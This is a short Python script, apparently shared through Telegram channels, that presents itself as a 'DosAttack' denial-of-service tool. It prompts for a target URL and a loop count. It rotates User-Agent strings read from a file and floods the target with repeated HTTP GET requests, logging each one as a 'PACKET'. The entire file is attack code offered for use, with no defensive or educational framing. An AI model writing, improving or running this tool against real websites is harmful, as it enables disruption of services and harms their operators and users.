# please install the "requests" home book to get started
# normal dos code
# creator: t.me/GKSVGK channel: t.me/iTechZIR,t.me/dev_2yt_code_c
import requests
import random

print("""
╔══════════════════════════════════════════════════════╗
║                     DosAttack                        ║
║                 Denial of Service                    ║
║                                                      ║
║            Version: 1.0    Creator: 2yt              ║
╚══════════════════════════════════════════════════════╝
""")

url = input("please enter url (https or http): ") # get url
loop = int(input("please enter loop count number: ")) # get loop

# definition user_agent
def set_user_agent():
    global headers
    with open("main\_user_agent_file_\__user_agent__.txt", "r", encoding='utf-8') as file: # open file user_agent
        user_agent = [line.strip() for line in file.readlines() if line.strip()] # read file
        headers = {'User-Agent': random.choice(user_agent)} # choice user_agent
    
# definition port
def set_port():
    global port
    if url.startswith("https://"): # if it was https
        port = 443 # it comes back 443
    elif url.startswith("http://"): # if it was http
        port = 80 # it comes back 80
    else: # there were none, come
        port = "UNKNOWN" # there were none

# definition status
def status_code():
    global status
    try:
        response = requests.get(url, timeout=5) # sends a request to the server every 5 seconds to see if it is responding or not
        if response.status_code == 200: # status code 200 = success
            status = "SUCCESS"
        else: # it wasnt
            status = f"FAILED: {response.status_code}" # returns the status_code
    except Exception as e: # there were none, come
        status = f"ERROR: {str(e)}" # print error

# definition dos_attack
def dos_attack():
    for i in range(loop): # run until it equals the loop variable
        requests.get(url, headers=headers) # conect server
        print(f"PACKET: {i} URL: {url} PORT: {port} STATUS: {status}") # print operation status

# start functions
set_user_agent()
set_port()
status_code()
dos_attack()

